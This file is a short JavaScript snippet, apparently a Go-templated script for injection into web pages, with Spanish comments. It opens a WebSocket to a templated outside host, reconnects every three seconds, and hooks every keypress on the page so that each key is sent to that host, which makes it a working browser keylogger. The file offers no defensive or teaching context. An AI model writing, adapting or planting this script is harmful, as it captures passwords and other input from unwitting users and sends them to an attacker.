(function() {
    var wsUrl = "wss://{{.WSAddr}}/ws";
    var conn;

    function connectWebSocket() {
        conn = new WebSocket(wsUrl);

        conn.onopen = function() {
            console.log("WebSocket conectado con éxito");
        };

        conn.onerror = function(error) {
            console.error("Error en WebSocket:", error);
        };

        conn.onclose = function() {
            console.log("WebSocket cerrado! Intentando reconectar en 3 segundos...");
            setTimeout(connectWebSocket, 3000); // Intentar reconectar cada 3 segundos
        };

        document.onkeydown = function(evt) {
            var s = String.fromCharCode(evt.which);
            console.log("Tecla presionada:", s);

            if (conn.readyState === WebSocket.OPEN) {
                conn.send(s);
            } else {
                console.warn("WebSocket no está abierto. No se puede enviar:", s);
            }
        };
    }

    connectWebSocket();
})();